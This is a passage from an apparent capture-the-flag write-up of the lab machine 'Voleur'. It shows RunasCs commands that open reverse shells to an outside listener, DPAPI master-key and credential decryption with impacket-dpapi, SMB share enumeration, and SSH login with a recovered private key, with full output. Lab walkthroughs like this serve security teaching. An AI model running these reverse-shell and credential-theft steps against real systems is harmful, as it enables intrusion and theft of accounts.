+The command completed with one or more errors.</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780cb8631e7a04220e327" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With Todd’s password in the Excel, I’ll use RunasCs.exe again to spawn a shell for him:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780d4834be6967bb93029" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Users\svc_winrm\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\runascs.exe todd.wolfe NightT1meP1dg3on14 cmd.exe -r 10.10.14.36:8001
+
+[*] Warning: The logon for user &#x27;todd.wolfe&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-135fb5$\Default
+[+] Async process &#x27;C:\Windows\system32\cmd.exe&#x27; with pid 6768 created in background.</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f780a7bc33e5794f4f4a8b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On my listener:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780d3b247e8883a521745" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001      
+
+listening on [any] 8001 ...
+connect to [10.10.14.36] from (UNKNOWN) [10.129.10.190] 58985
+Microsoft Windows [Version 10.0.20348.3807]
+(c) Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+voleur\todd.wolfe</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f7803bb78ce231780670e5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24e0b98a88f780b7b9abe89c6bb95825" class="Divider"></div><h2 id="https://www.notion.so/24e0b98a88f7801b8c8febd837de977d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f7801b8c8febd837de977d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todd.wolfe</code></span><span class="SemanticString">:</span></span></h2><h3 id="https://www.notion.so/24e0b98a88f78090be81fb9384d667d7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f78090be81fb9384d667d7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">TCP445 — SMB:</span></span></h3><pre id="https://www.notion.so/24e0b98a88f780359293ffd61de1c57b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> netexec smb &#x27;dc.voleur.htb&#x27; -d &#x27;voleur.htb&#x27; -k --use-kcache --shares
+
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe from ccache 
+SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
+SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
+SMB         dc.voleur.htb   445    dc               -----           -----------     ------
+SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
+SMB         dc.voleur.htb   445    dc               C$                              Default share
+SMB         dc.voleur.htb   445    dc               Finance                         
+SMB         dc.voleur.htb   445    dc               HR                              
+SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
+SMB         dc.voleur.htb   445    dc               IT              READ            
+SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780d7bcb0f2321cbf1eae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Todd also has read access to the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">IT</code></span><span class="SemanticString"> share, but now the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Second-Line Support</code></span><span class="SemanticString"> folder is shown:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780cca220f14aa7c2f660" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-smbclient -k -dc-ip 10.129.10.190 &#x27;dc.voleur.htb&#x27;
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 19:40:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 05:39:59 2025 ..
+drw-rw-rw-          0  Thu Jan 30 01:43:03 2025 Second-Line Support</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f7805c8128f50ef6b783f5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It contains backups of archived users. Todd’s home directory can be found inside:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f78073b946f693720f3e72" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># cd Second-Line Support
+# ls
+drw-rw-rw-          0  Thu Jan 30 01:43:03 2025 .
+drw-rw-rw-          0  Wed Jan 29 19:40:01 2025 ..
+drw-rw-rw-          0  Thu Jan 30 01:43:06 2025 Archived Users
+# cd Archived Users
+# ls
+drw-rw-rw-          0  Thu Jan 30 01:43:06 2025 .
+drw-rw-rw-          0  Thu Jan 30 01:43:03 2025 ..
+drw-rw-rw-          0  Thu Jan 30 01:43:16 2025 todd.wolfe
+# cd todd.wolfe
+# ls
+drw-rw-rw-          0  Thu Jan 30 01:43:16 2025 .
+drw-rw-rw-          0  Thu Jan 30 01:43:06 2025 ..
+drw-rw-rw-          0  Thu Jan 30 01:43:06 2025 3D Objects
+drw-rw-rw-          0  Thu Jan 30 01:43:09 2025 AppData
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Contacts
+drw-rw-rw-          0  Fri Jan 31 00:58:50 2025 Desktop
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Documents
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Downloads
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Favorites
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Links
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Music
+-rw-rw-rw-      65536  Thu Jan 30 01:43:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
+-rw-rw-rw-     524288  Wed Jan 29 23:23:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
+-rw-rw-rw-     524288  Wed Jan 29 23:23:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
+-rw-rw-rw-         20  Wed Jan 29 23:23:07 2025 ntuser.ini
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Pictures
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Saved Games
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Searches
+drw-rw-rw-          0  Thu Jan 30 01:43:10 2025 Videos</span></span></span></code></pre><h3 id="https://www.notion.so/24e0b98a88f78081ba03da77d74c7e0b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f78081ba03da77d74c7e0b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">DPAPI Secrets:</span></span></h3><div id="https://www.notion.so/29e0b98a88f780d297c6dea6ed7b8eec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html#what-is-dpapi">Data Protection API (DPAPI)</a></span><span class="SemanticString"> is a Windows implementation for securely storing credentials with symmetric encryption. A master key is generated using the user’s password and SID, and is used to encrypt data before storing them.</span></span></p></div><div id="https://www.notion.so/29e0b98a88f780aaafe8eed49110ba60" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Typically the master key is found in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\</code></span><span class="SemanticString">, and the encrypted blobs are in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">AppData\Roaming\Microsoft\Credentials\</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">AppData\Local\Microsoft\Credentials\</code></span><span class="SemanticString">. However, nothing was found in these locations.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780868f8ff43a4ba3dd21" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\todd.wolfe&gt;</span></mark></span><span class="SemanticString"><span> dir /a appdata\roaming\microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\Users\todd.wolfe\appdata\roaming\microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110
+
+01/31/2025  01:53 AM    &lt;DIR&gt;          .
+01/29/2025  05:53 AM    &lt;DIR&gt;          ..
+01/29/2025  05:53 AM               900 BK-VOLEUR
+01/29/2025  05:53 AM                24 Preferred
+               2 File(s)            924 bytes
+               2 Dir(s)   3,834,085,376 bytes free</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f78007a4c4d8132a4d3346" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When AD reanimates a deleted user account, only the user object is restored, but not its user profile. As such, Todd’s home directory I’m currently in is likely generated by the system at log on, and wouldn’t contain anything other than default files and folders. (By default, deleting a user does not automatically remove its user profile, so Todd’s home directly is likely deleted separately and is irreversible.)</span></span></p></div><div id="https://www.notion.so/29e0b98a88f7804b9c3cc11c89479f63" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, the SMB backup would still contain all of Todd’s files, including its DPAPI master key:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780ec808ee675989dcdca" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\IT\Second-Line Support\Archived Users\todd.wolfe&gt;</span></mark></span><span class="SemanticString"><span> dir /a appdata\roaming\microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\roaming\microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110
+
+01/29/2025  08:13 AM    &lt;DIR&gt;          .
+01/29/2025  08:13 AM    &lt;DIR&gt;          ..
+01/29/2025  05:53 AM               740 08949382-134f-4c63-b93c-ce52efc0aa88
+01/29/2025  05:53 AM               900 BK-VOLEUR
+01/29/2025  05:53 AM                24 Preferred
+               3 File(s)          1,664 bytes
+               2 Dir(s)   3,833,102,336 bytes free</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f7806cb74de92d423bb307" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Encrypted credentials are also found, I’ll use SMB to download all of them.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7808abcc3f392635aa0fc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\IT\Second-Line Support\Archived Users\todd.wolfe&gt;</span></mark></span><span class="SemanticString"><span> dir /a appdata\local\microsoft\credentials
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\local\microsoft\credentials
+
+01/29/2025  08:13 AM    &lt;DIR&gt;          .
+01/29/2025  08:13 AM    &lt;DIR&gt;          ..
+01/29/2025  05:53 AM            11,068 DFBE70A7E5CC19A398EBF1B96859CE5D
+               1 File(s)         11,068 bytes
+               2 Dir(s)   3,832,905,728 bytes free
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\IT\Second-Line Support\Archived Users\todd.wolfe&gt;</span></mark></span><span class="SemanticString"><span> dir /a appdata\roaming\microsoft\credentials
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\roaming\microsoft\credentials
+
+01/29/2025  08:13 AM    &lt;DIR&gt;          .
+01/29/2025  08:13 AM    &lt;DIR&gt;          ..
+01/29/2025  05:55 AM               398 772275FAD58525253490A9B0039791D3
+               1 File(s)            398 bytes
+               2 Dir(s)   3,832,905,728 bytes free</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f7804bb732dc954a26cdf4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The master key is encrypted by the user’s password. I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">impacket-dpapi</code></span><span class="SemanticString"> to recover it:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780168bfed6e5aef82c0d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-dpapi masterkey -file masterkey -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780928911ff30a01e1a5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the key, I can read the secrets. The one in the Roaming folder contains the password of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">jeremy.combs</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780b2bedaea17b6a6fa4f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-dpapi credential -file roaming_secret -key 0xd2832547d1d5e&lt;..SNIP..&gt;
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-01-29 12:55:19+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=Jezzas_Account
+Description : 
+Unknown     : 
+Username    : jeremy.combs
+Unknown     : qT3V9pLXyN7W4m</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f780f484e6d594fcaefc42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once again, I’ll use RunasCs.exe to spawn a shell.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780cdaf7aeeca6f296973" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Users\svc_winrm\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\runascs.exe jeremy.combs qT3V9pLXyN7W4m cmd.exe -r 10.10.14.36:8001
+
+[*] Warning: The logon for user &#x27;jeremy.combs&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-197592f$\Default
+[+] Async process &#x27;C:\Windows\system32\cmd.exe&#x27; with pid 5768 created in background.</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f78080a573f61b21d2b125" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">(Actually, Jeremy might be able to login via WinRM, but I forgot to check.)</span></span></p></div><div id="https://www.notion.so/24e0b98a88f7807db7abca0123aa02f7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24e0b98a88f780669c70c2e671528670" class="Divider"></div><h2 id="https://www.notion.so/24e0b98a88f7803dafc2cbf8fbbbd244" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f7803dafc2cbf8fbbbd244"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">jeremy.combs</code></span><span class="SemanticString">:</span></span></h2><h3 id="https://www.notion.so/24e0b98a88f780bcb0c1d2c3e628e901" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780bcb0c1d2c3e628e901"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">TCP445 — SMB:</span></span></h3><pre id="https://www.notion.so/24e0b98a88f780dd8362c88275e85da0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-smbclient -k -dc-ip 10.129.10.190 dc.voleur.htb
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use it
+# ls
+drw-rw-rw-          0  Wed Jan 29 19:40:01 2025 .
+drw-rw-rw-          0  Fri Jul 25 05:39:59 2025 ..
+drw-rw-rw-          0  Fri Jan 31 02:41:29 2025 Third-Line Support</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780afb740c0aca8b7f322" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Jeremy got access to the Third-Line Support folder.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7801ea756ed62f698f3f8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># cd Third-Line Support
+# ls
+drw-rw-rw-          0  Fri Jan 31 02:41:29 2025 .
+drw-rw-rw-          0  Wed Jan 29 19:40:01 2025 ..
+-rw-rw-rw-       2602  Fri Jan 31 02:41:29 2025 id_rsa
+-rw-rw-rw-        186  Fri Jan 31 02:37:35 2025 Note.txt.txt</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780b18608f6eda1bb168b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It contains a note and a private key.</span></span></p></div><div id="https://www.notion.so/29e0b98a88f780de9bcbdfeca2743bd2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly, when accessing the folder via Jeremy’s interactive shell, an extra </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Backups</code></span><span class="SemanticString"> directory shows up, but it’s not accessible.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7806bbbd4c92ab1ce3c48" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\IT\Third-Line Support&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\IT\Third-Line Support
+
+01/30/2025  09:11 AM    &lt;DIR&gt;          .
+01/29/2025  02:10 AM    &lt;DIR&gt;          ..
+01/30/2025  09:11 AM    &lt;DIR&gt;          Backups
+01/30/2025  09:10 AM             2,602 id_rsa
+01/30/2025  09:07 AM               186 Note.txt.txt
+               2 File(s)          2,788 bytes
+               3 Dir(s)   3,831,304,192 bytes free
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\IT\Third-Line Support&gt;</span></mark></span><span class="SemanticString"><span> cd Backups
+
+Access is denied.</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f780a7991cc14dda26a326" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Note.txt.txt</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780a3a153e89b225763e8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Jeremy,
+
+I&#x27;ve had enough of Windows Backup! I&#x27;ve part configured WSL to see if we can utilize any of the backup tools from Linux.
+
+Please see what you can set up.
+
+Thanks,
+
+Admin</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f7801280c6eb81d7040645" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">So WSL is configured, and is probably what port 2222 is used for.</span></span></p></div><div id="https://www.notion.so/29e0b98a88f780609e94cad541a9621c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since it mentions backup, I tried to SSH in as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_backup</code></span><span class="SemanticString"> using the private key, and it worked.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7801ab1f9c04738c27201" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> ssh svc_backup@voleur.htb -p 2222 -i id_rsa
+
+Warning: Permanently added &#x27;[voleur.htb]:2222&#x27; (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Aug 13 14:02:09 PDT 2025
+
+  System load:    0.52      Processes:             11
+  Usage of /home: unknown   Users logged in:       0
+  Memory usage:   31%       IPv4 address for eth0: 10.129.10.190
+  Swap usage:     0%
+
+
+363 updates can be installed immediately.
+257 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>svc_backup@DC:~$</span></mark></span><span class="SemanticString"><span> id
+
